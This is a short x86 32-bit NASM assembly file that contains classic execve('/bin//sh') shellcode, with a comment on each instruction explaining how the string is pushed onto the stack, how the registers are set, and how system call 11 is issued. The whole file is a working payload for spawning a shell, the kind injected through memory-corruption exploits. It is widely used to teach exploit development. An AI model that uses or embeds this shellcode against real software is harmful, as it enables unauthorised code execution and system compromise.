BITS 32

xor eax, eax        ; zero eax
push eax            ; null terminate the string
push 0x68732f2f     ; push //sh (// is same as / for our purpose)
push 0x6e69622f     ; push /bin
mov ebx, esp        ; pass first argument using ebx
push eax            ; third argument is empty
mov edx, esp
push eax            ; second argument is empty
mov ecx, esp
mov al, 11          ; execve is system call #11
int 0x80            ; issue an interrupt

